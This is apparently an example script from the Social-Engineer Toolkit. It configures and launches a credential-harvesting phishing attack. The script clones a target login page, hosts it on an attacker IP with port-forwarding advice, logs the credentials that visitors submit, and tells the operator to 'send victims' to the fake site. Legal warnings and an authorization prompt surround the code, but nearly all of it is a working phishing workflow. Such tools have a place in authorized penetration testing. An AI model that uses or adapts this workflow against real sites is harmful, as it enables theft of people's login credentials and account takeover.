#!/usr/bin/env python3
"""
Example: Credential Harvester
Social-Engineer Toolkit (SET)

This example demonstrates how to setup a credential harvesting
attack that clones a login page and captures entered credentials.

DISCLAIMER: For authorized testing only!
"""

from src.core.setcore import *
import sys
import os
import time

def setup_credential_harvester():
    """
    Configure and setup a credential harvester attack
    """
    
    # Configuration
    target_login_page = "https://login.example.com"
    attacker_ip = "10.0.0.5"
    web_port = "80"
    
    print_status("Starting Credential Harvester Configuration")
    print_status(f"Target Login Page: {target_login_page}")
    print_status(f"Attacker IP: {attacker_ip}")
    print_status(f"Web Server Port: {web_port}")
    
    # Important information for user
    print_info("="*70)
    print_info("IMPORTANT: Credential Harvester Information")
    print_info("="*70)
    print_info("The harvester clones a website and monitors POST requests.")
    print_info("When victims enter credentials, they will be logged.")
    print_info("")
    print_info("If you're behind NAT, make sure to:")
    print_info("1. Use your EXTERNAL IP address below")
    print_info("2. Configure port forwarding from external to internal IP")
    print_info("3. Ensure firewall allows incoming connections")
    print_info("="*70)
    print("")
    
    # Step 1: Configure IP address
    print_info("Step 1: Configuring attacker IP address")
    
    # Optionally detect public IP
    try:
        detected_ip = detect_public_ip()
        print_status(f"Detected IP: {detected_ip}")
        use_detected = yesno_prompt(["0"], f"Use detected IP ({detected_ip})? [yes|no]")
        
        if use_detected == "YES":
            attacker_ip = detected_ip
    except:
        print_warning("Could not auto-detect IP address")
    
    update_options(f"IPADDR={attacker_ip}")
    print_status(f"Using IP address: {attacker_ip}")
    
    # Step 2: Configure site template
    print_info("Step 2: Setting up website cloning configuration")
    site_template_path = userconfigpath + "site.template"
    
    with open(site_template_path, "w") as f:
        f.write("TEMPLATE=CUSTOM\n")
        f.write(f"URL={target_login_page}\n")
    
    print_status(f"Site template created")
    
    # Step 3: Set attack vector to harvester
    print_info("Step 3: Setting attack vector to credential harvester")
    attack_vector_path = userconfigpath + "attack_vector"
    
    with open(attack_vector_path, "w") as f:
        f.write("harvester")
    
    print_status("Attack vector set to: harvester")
    
    # Step 4: Clone the website
    print_info("Step 4: Cloning target login page")
    print_warning("This will download the website and prepare it for harvesting")
    
    try:
        # Import the cloner module
        sys.path.append(definepath())
        import src.webattack.web_clone.cloner
        
        # Check if cloning was successful
        if os.path.isfile(userconfigpath + "cloner.failed"):
            print_error("Website cloning failed!")
            print_error("Possible reasons:")
            print_error("  - No internet connection")
            print_error("  - Target site blocks scraping")
            print_error("  - Invalid URL")
            return False
        
        print_status("Website cloned successfully")
        
    except Exception as e:
        print_error(f"Error during cloning: {str(e)}")
        log(e)
        return False
    
    # Step 5: Start the harvester
    print_info("Step 5: Starting credential harvester")
    
    try:
        # Import harvester module
        sys.path.append(definepath() + "/src/webattack/harvester")
        import harvester
        
        print_status("Credential harvester started successfully")
        
    except Exception as e:
        print_error(f"Error starting harvester: {str(e)}")
        log(e)
        return False
    
    # Step 6: Display information
    print_status("="*70)
    print_status("Credential Harvester Active!")
    print_status("="*70)
    print_info(f"Phishing site available at: http://{attacker_ip}")
    print_info(f"Credentials will be logged to: {userconfigpath}harvester_*.txt")
    print_warning("Send victims to the URL above")
    print_warning("Monitor logs for captured credentials")
    print_status("="*70)
    print_info("Press Ctrl+C to stop the harvester")
    
    return True

def monitor_credentials():
    """
    Monitor and display captured credentials
    """
    print_info("Monitoring for captured credentials...")
    print_info("(This is a simulation - actual monitoring done by harvester module)")
    print_info("")
    
    # In real usage, you would monitor log files
    # Example:
    # import glob
    # log_files = glob.glob(userconfigpath + "harvester_*.txt")
    # for log_file in log_files:
    #     with open(log_file, 'r') as f:
    #         credentials = f.read()
    #         if credentials:
    #             print_status("Credentials captured!")
    #             print(credentials)

def main():
    """
    Main function
    """
    # Check if running as root on POSIX systems
    if check_os() == "posix":
        if os.geteuid() != 0:
            print_error("This script must be run as root on Linux/Unix systems")
            sys.exit(1)
    
    # Display banner
    print_status("Credential Harvester Example")
    print_status("Social-Engineer Toolkit (SET)")
    print_warning("For authorized testing only!")
    print("")
    
    # Warning about legal usage
    print_warning("="*70)
    print_warning("LEGAL WARNING")
    print_warning("="*70)
    print_warning("Credential harvesting without authorization is ILLEGAL!")
    print_warning("Only use this against systems you have permission to test.")
    print_warning("Ensure you have written authorization before proceeding.")
    print_warning("="*70)
    print("")
    
    # Confirm with user
    response = yesno_prompt(["0"], "Do you have authorization to proceed? [yes|no]")
    
    if response == "YES":
        success = setup_credential_harvester()
        
        if success:
            print_status("Harvester is now running!")
            print_info("Check the logs for captured credentials")
            monitor_credentials()
        else:
            print_error("Harvester setup failed!")
            
    else:
        print_info("Operation cancelled - no authorization")
    
    # Cleanup
    return_continue()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_warning("\nHarvester stopped by user")
        print_status("Captured credentials saved to log files")
        cleanup_routine()
        sys.exit(0)
    except Exception as e:
        print_error(f"Unexpected error: {str(e)}")
        log(e)
        cleanup_routine()
        sys.exit(1)
